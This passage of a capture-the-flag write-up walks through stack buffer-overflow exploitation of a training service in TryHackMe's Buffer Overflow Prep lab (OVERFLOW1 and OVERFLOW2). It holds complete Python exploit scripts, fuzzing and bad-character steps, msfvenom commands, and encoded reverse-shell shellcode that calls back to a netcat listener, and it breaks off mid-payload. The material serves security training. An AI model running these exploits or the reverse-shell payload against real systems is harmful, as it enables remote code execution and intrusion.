[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xd9\xc9\xba\x75\x58\x6c\xe1\xd9\x74\x24\xf4"
payload += b"\x5f\x29\xc9\xb1\x52\x31\x57\x17\x83\xef\xfc"
payload += b"\x03\x22\x4b\x8e\x14\x30\x83\xcc\xd7\xc8\x54"
payload += b"\xb1\x5e\x2d\x65\xf1\x05\x26\xd6\xc1\x4e\x6a"
payload += b"\xdb\xaa\x03\x9e\x68\xde\x8b\x91\xd9\x55\xea"
payload += b"\x9c\xda\xc6\xce\xbf\x58\x15\x03\x1f\x60\xd6"
payload += b"\x56\x5e\xa5\x0b\x9a\x32\x7e\x47\x09\xa2\x0b"
payload += b"\x1d\x92\x49\x47\xb3\x92\xae\x10\xb2\xb3\x61"
payload += b"\x2a\xed\x13\x80\xff\x85\x1d\x9a\x1c\xa3\xd4"
payload += b"\x11\xd6\x5f\xe7\xf3\x26\x9f\x44\x3a\x87\x52"
payload += b"\x94\x7b\x20\x8d\xe3\x75\x52\x30\xf4\x42\x28"
payload += b"\xee\x71\x50\x8a\x65\x21\xbc\x2a\xa9\xb4\x37"
payload += b"\x20\x06\xb2\x1f\x25\x99\x17\x14\x51\x12\x96"
payload += b"\xfa\xd3\x60\xbd\xde\xb8\x33\xdc\x47\x65\x95"
payload += b"\xe1\x97\xc6\x4a\x44\xdc\xeb\x9f\xf5\xbf\x63"
payload += b"\x53\x34\x3f\x74\xfb\x4f\x4c\x46\xa4\xfb\xda"
payload += b"\xea\x2d\x22\x1d\x0c\x04\x92\xb1\xf3\xa7\xe3"
payload += b"\x98\x37\xf3\xb3\xb2\x9e\x7c\x58\x42\x1e\xa9"
payload += b"\xcf\x12\xb0\x02\xb0\xc2\x70\xf3\x58\x08\x7f"
payload += b"\x2c\x78\x33\x55\x45\x13\xce\x3e\x60\xe4\xd0"
payload += b"\xb8\x1c\xe6\xd0\xc5\x67\x6f\x36\xaf\x87\x26"
payload += b"\xe1\x58\x31\x63\x79\xf8\xbe\xb9\x04\x3a\x34"
payload += b"\x4e\xf9\xf5\xbd\x3b\xe9\x62\x4e\x76\x53\x24"
payload += b"\x51\xac\xfb\xaa\xc0\x2b\xfb\xa5\xf8\xe3\xac"
payload += b"\xe2\xcf\xfd\x38\x1f\x69\x54\x5e\xe2\xef\x9f"
payload += b"\xda\x39\xcc\x1e\xe3\xcc\x68\x05\xf3\x08\x70"
payload += b"\x01\xa7\xc4\x27\xdf\x11\xa3\x91\x91\xcb\x7d"
payload += b"\x4d\x78\x9b\xf8\xbd\xbb\xdd\x04\xe8\x4d\x01"
payload += b"\xb4\x45\x08\x3e\x79\x02\x9c\x47\x67\xb2\x63"
payload += b"\x92\x23\xd2\x81\x36\x5e\x7b\x1c\xd3\xe3\xe6"
payload += b"\x9f\x0e\x27\x1f\x1c\xba\xd8\xe4\x3c\xcf\xdd"
payload += b"\xa1\xfa\x3c\xac\xba\x6e\x42\x03\xba\xba" 
```
{% endraw %}

<br />
Update the code with the payload the we just generated.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x07\x2e\xa0

payload =  b""
payload += b"\xd9\xc9\xba\x75\x58\x6c\xe1\xd9\x74\x24\xf4"
payload += b"\x5f\x29\xc9\xb1\x52\x31\x57\x17\x83\xef\xfc"
payload += b"\x03\x22\x4b\x8e\x14\x30\x83\xcc\xd7\xc8\x54"
payload += b"\xb1\x5e\x2d\x65\xf1\x05\x26\xd6\xc1\x4e\x6a"
payload += b"\xdb\xaa\x03\x9e\x68\xde\x8b\x91\xd9\x55\xea"
payload += b"\x9c\xda\xc6\xce\xbf\x58\x15\x03\x1f\x60\xd6"
payload += b"\x56\x5e\xa5\x0b\x9a\x32\x7e\x47\x09\xa2\x0b"
payload += b"\x1d\x92\x49\x47\xb3\x92\xae\x10\xb2\xb3\x61"
payload += b"\x2a\xed\x13\x80\xff\x85\x1d\x9a\x1c\xa3\xd4"
payload += b"\x11\xd6\x5f\xe7\xf3\x26\x9f\x44\x3a\x87\x52"
payload += b"\x94\x7b\x20\x8d\xe3\x75\x52\x30\xf4\x42\x28"
payload += b"\xee\x71\x50\x8a\x65\x21\xbc\x2a\xa9\xb4\x37"
payload += b"\x20\x06\xb2\x1f\x25\x99\x17\x14\x51\x12\x96"
payload += b"\xfa\xd3\x60\xbd\xde\xb8\x33\xdc\x47\x65\x95"
payload += b"\xe1\x97\xc6\x4a\x44\xdc\xeb\x9f\xf5\xbf\x63"
payload += b"\x53\x34\x3f\x74\xfb\x4f\x4c\x46\xa4\xfb\xda"
payload += b"\xea\x2d\x22\x1d\x0c\x04\x92\xb1\xf3\xa7\xe3"
payload += b"\x98\x37\xf3\xb3\xb2\x9e\x7c\x58\x42\x1e\xa9"
payload += b"\xcf\x12\xb0\x02\xb0\xc2\x70\xf3\x58\x08\x7f"
payload += b"\x2c\x78\x33\x55\x45\x13\xce\x3e\x60\xe4\xd0"
payload += b"\xb8\x1c\xe6\xd0\xc5\x67\x6f\x36\xaf\x87\x26"
payload += b"\xe1\x58\x31\x63\x79\xf8\xbe\xb9\x04\x3a\x34"
payload += b"\x4e\xf9\xf5\xbd\x3b\xe9\x62\x4e\x76\x53\x24"
payload += b"\x51\xac\xfb\xaa\xc0\x2b\xfb\xa5\xf8\xe3\xac"
payload += b"\xe2\xcf\xfd\x38\x1f\x69\x54\x5e\xe2\xef\x9f"
payload += b"\xda\x39\xcc\x1e\xe3\xcc\x68\x05\xf3\x08\x70"
payload += b"\x01\xa7\xc4\x27\xdf\x11\xa3\x91\x91\xcb\x7d"
payload += b"\x4d\x78\x9b\xf8\xbd\xbb\xdd\x04\xe8\x4d\x01"
payload += b"\xb4\x45\x08\x3e\x79\x02\x9c\x47\x67\xb2\x63"
payload += b"\x92\x23\xd2\x81\x36\x5e\x7b\x1c\xd3\xe3\xe6"
payload += b"\x9f\x0e\x27\x1f\x1c\xba\xd8\xe4\x3c\xcf\xdd"
payload += b"\xa1\xfa\x3c\xac\xba\x6e\x42\x03\xba\xba"

inputBuffer = b'A' * 1978
inputBuffer += pack('<L',(0x625011af))
inputBuffer += payload
inputBuffer += b'C' * (2400 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Update the code with a nop sled.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x07\x2e\xa0

payload =  b""
payload += b"\xd9\xc9\xba\x75\x58\x6c\xe1\xd9\x74\x24\xf4"
payload += b"\x5f\x29\xc9\xb1\x52\x31\x57\x17\x83\xef\xfc"
payload += b"\x03\x22\x4b\x8e\x14\x30\x83\xcc\xd7\xc8\x54"
payload += b"\xb1\x5e\x2d\x65\xf1\x05\x26\xd6\xc1\x4e\x6a"
payload += b"\xdb\xaa\x03\x9e\x68\xde\x8b\x91\xd9\x55\xea"
payload += b"\x9c\xda\xc6\xce\xbf\x58\x15\x03\x1f\x60\xd6"
payload += b"\x56\x5e\xa5\x0b\x9a\x32\x7e\x47\x09\xa2\x0b"
payload += b"\x1d\x92\x49\x47\xb3\x92\xae\x10\xb2\xb3\x61"
payload += b"\x2a\xed\x13\x80\xff\x85\x1d\x9a\x1c\xa3\xd4"
payload += b"\x11\xd6\x5f\xe7\xf3\x26\x9f\x44\x3a\x87\x52"
payload += b"\x94\x7b\x20\x8d\xe3\x75\x52\x30\xf4\x42\x28"
payload += b"\xee\x71\x50\x8a\x65\x21\xbc\x2a\xa9\xb4\x37"
payload += b"\x20\x06\xb2\x1f\x25\x99\x17\x14\x51\x12\x96"
payload += b"\xfa\xd3\x60\xbd\xde\xb8\x33\xdc\x47\x65\x95"
payload += b"\xe1\x97\xc6\x4a\x44\xdc\xeb\x9f\xf5\xbf\x63"
payload += b"\x53\x34\x3f\x74\xfb\x4f\x4c\x46\xa4\xfb\xda"
payload += b"\xea\x2d\x22\x1d\x0c\x04\x92\xb1\xf3\xa7\xe3"
payload += b"\x98\x37\xf3\xb3\xb2\x9e\x7c\x58\x42\x1e\xa9"
payload += b"\xcf\x12\xb0\x02\xb0\xc2\x70\xf3\x58\x08\x7f"
payload += b"\x2c\x78\x33\x55\x45\x13\xce\x3e\x60\xe4\xd0"
payload += b"\xb8\x1c\xe6\xd0\xc5\x67\x6f\x36\xaf\x87\x26"
payload += b"\xe1\x58\x31\x63\x79\xf8\xbe\xb9\x04\x3a\x34"
payload += b"\x4e\xf9\xf5\xbd\x3b\xe9\x62\x4e\x76\x53\x24"
payload += b"\x51\xac\xfb\xaa\xc0\x2b\xfb\xa5\xf8\xe3\xac"
payload += b"\xe2\xcf\xfd\x38\x1f\x69\x54\x5e\xe2\xef\x9f"
payload += b"\xda\x39\xcc\x1e\xe3\xcc\x68\x05\xf3\x08\x70"
payload += b"\x01\xa7\xc4\x27\xdf\x11\xa3\x91\x91\xcb\x7d"
payload += b"\x4d\x78\x9b\xf8\xbd\xbb\xdd\x04\xe8\x4d\x01"
payload += b"\xb4\x45\x08\x3e\x79\x02\x9c\x47\x67\xb2\x63"
payload += b"\x92\x23\xd2\x81\x36\x5e\x7b\x1c\xd3\xe3\xe6"
payload += b"\x9f\x0e\x27\x1f\x1c\xba\xd8\xe4\x3c\xcf\xdd"
payload += b"\xa1\xfa\x3c\xac\xba\x6e\x42\x03\xba\xba"

inputBuffer = b'A' * 1978
inputBuffer += pack('<L',(0x625011af))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (2400 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

s.connect((url,port))
s.recv(1024)

print('[*] Sending payload')
s.sendall(b'OVERFLOW1 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ... 
```
{% endraw %}

<br />
Run the code and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW1]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56175
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers> 
```
{% endraw %}

<br />
<b><u>OVERFLOW2<br /></u></b>

Create a script that connects to the service and sends the OVERFLOW2 command mimicking normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW2 aaaa\r\n')
print(s.recv(1024))

s.close() 
```
{% endraw %}

<br />
Update the code to fuzz the command with increasing length to find the breakpoint.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 30:
    buffers.append(b'A' * counter)
    counter += 100

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW2 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close() 
```
{% endraw %}

<br />
Run the code and observe the breakpoint.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW2/thm-overflow2_0x00.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 200
[*] Sending: 300
[*] Sending: 400
[*] Sending: 500
[*] Sending: 600
[*] Sending: 700 
```
{% endraw %}

<br />
Check the EIP to ensure that our 41s are in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of2/firsteip.png" title="First EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code to hardcode the break value.  Add 400 to the string to make room for the payload.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1100

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the code and check the EIP and ensure that we still have the 41s.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of2/seceip.png" title="Second EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msf-pattern_create to generate a string that we can use to determine the offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
└─$ msf-pattern_create -l 1100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk 
```
{% endraw %}

<br />
Update the code with string that we just created.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# inputBuffer = b'A' * 1100
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the code again and get the value that is stored in the EIP register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of2/thirdeip.png" title="Third EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use pattern offset to get the offset value.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
└─$ msf-pattern_offset -l 1100 -q 76413176
[*] Exact match at offset 634 
```
{% endraw %}

<br />
Update the code with offset that we just discovered.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 634
inputBuffer += b'B' * 4
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the code and check the EIP for our 42s.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of2/42eip.png" title="EIP 42s" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with all of the badchars (minus \x00) so we can find the bad chars.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 634
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the ESP register and look for any mangles.  Notice the issue at \x23.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of2/secesp.png" title="Second ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Remove \x23 from the badchars list.  Send the new list and re-check ESP.  Repeat this procedure until the code runs clean.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x23\x3c\x83\xba

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 634
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Load the narly module in WinDBG.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of2/narly.png" title="Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run !nmod to get the list of modules and their associated security.  Find one with no security and badchars in the memory addresses.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of2/nmod.png" title="!nmod" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Search the memory range for a jmp esp.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of2/jmpesp.png" title="Find jmp esp" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script with the memory address.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x23\x3c\x83\xba

payload = b'D' * 400

inputBuffer = b'A' * 634
inputBuffer += pack('<L',(0x625011af))
inputBuffer += payload
inputBuffer += b'C' * (1100 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW2 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Perform all the breakpoint analysis like we did with OVERFLOW1.  Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -b '\x00\x23\x3c\x83\xba' -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=21, char=0x83)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=112, char=0x23)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=17, char=0x83)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1922 bytes
payload =  b""
payload += b"\xfc\xbb\x2e\xf7\x96\x80\xeb\x0c\x5e\x56\x31"
payload += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
payload += b"\xff\xff\xff\xd2\x1f\x14\x80\x2a\xe0\x79\x08"
payload += b"\xcf\xd1\xb9\x6e\x84\x42\x0a\xe4\xc8\x6e\xe1"
payload += b"\xa8\xf8\xe5\x87\x64\x0f\x4d\x2d\x53\x3e\x4e"
payload += b"\x1e\xa7\x21\xcc\x5d\xf4\x81\xed\xad\x09\xc0"
payload += b"\x2a\xd3\xe0\x90\xe3\x9f\x57\x04\x87\xea\x6b"
payload += b"\xaf\xdb\xfb\xeb\x4c\xab\xfa\xda\xc3\xa7\xa4"
payload += b"\xfc\xe2\x64\xdd\xb4\xfc\x69\xd8\x0f\x77\x59"
payload += b"\x96\x91\x51\x93\x57\x3d\x9c\x1b\xaa\x3f\xd9"
payload += b"\x9c\x55\x4a\x13\xdf\xe8\x4d\xe0\x9d\x36\xdb"
payload += b"\xf2\x06\xbc\x7b\xde\xb7\x11\x1d\x95\xb4\xde"
payload += b"\x69\xf1\xd8\xe1\xbe\x8a\xe5\x6a\x41\x5c\x6c"
payload += b"\x28\x66\x78\x34\xea\x07\xd9\x90\x5d\x37\x39"
payload += b"\x7b\x01\x9d\x32\x96\x56\xac\x19\xff\x9b\x9d"
payload += b"\xa1\xff\xb3\x96\xd2\xcd\x1c\x0d\x7c\x7e\xd4"
payload += b"\x8b\x7b\x81\xcf\x6c\x13\x7c\xf0\x8c\x3a\xbb"
